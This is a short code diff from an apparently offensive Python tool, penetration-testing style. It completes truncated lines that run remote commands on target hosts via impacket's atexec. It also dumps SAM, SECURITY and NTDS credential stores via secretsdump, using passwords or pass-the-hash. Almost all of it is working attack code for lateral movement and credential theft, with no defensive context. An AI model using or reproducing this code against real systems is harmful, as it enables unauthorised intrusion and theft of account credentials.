@@ -730,7 +730,7 @@ Create Pasteable Double Encoded Script:
                     print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
                 if command == "cmd.exe":
                     sys.exit("[!] Please provide a viable command for execution")
-                attack=atexec.ATSVC_EXEC(username = usr, password = pwd, domain
+                attack=atexec.ATSVC_EXEC(username = usr, password = pwd, domain = dom, command = unprotected_command)
                 attack.play(dst)
             if attacks:
                 srv.terminate()
@@ -738,10 +738,10 @@ Create Pasteable Double Encoded Script:
     elif sam_dump:
         for dst in final_targets:
             if hash:
-                print("[*] Attempting to access the system %s with, user: %s has
+                print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
             else:
-                print("[*] Attempting to access the system %s with, user: %s pwd
-            attack=secretsdump.DumpSecrets(address = dst, username = usr, passwo                                                                                        tem, security = security, sam = sam, ntds = ntds)
+                print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
+            attack=secretsdump.DumpSecrets(address = dst, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, doKerberos = kerberos, system = system, security = security, sam = sam, ntds = ntds)
             try:
                 attack.dump()
             except Execption, e:
